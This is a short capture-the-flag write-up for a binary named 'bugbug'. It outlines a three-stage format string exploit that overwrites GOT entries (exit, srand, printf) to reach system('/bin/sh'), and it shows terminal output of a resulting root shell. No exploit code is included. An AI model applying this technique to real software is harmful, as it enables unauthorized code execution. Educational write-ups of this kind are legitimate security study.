# bugbug
**write-up**

- leak `seed` value
- can get `rand()` value
- printf(&buf) -> format string bug
- 3 stages attack
- overwrite `exit@got` to `main`
- overwrite `srand()` to something
- overwrite `printf()` to `system` -> system("/bin/sh");


```
sh: 2: Who: not found
sh: 2: Hello~: not found

==============================
> Let's play the lotto game! <
==============================
Input your answer@_@
sh: 1: Syntax error: end of file unexpected
$ 11 15 16 25 43 13

sh: 1: Congratulation,: not found
$ ls
bugbug        bugbug.id1    bugbug.idb  bugbug.til    floppy     serial
bugbug.id0  bugbug.id2    bugbug.nam  core    Manager  solve_bugbug.py
$ id
uid=0(root) gid=0(root) groups=0(root)
$
```
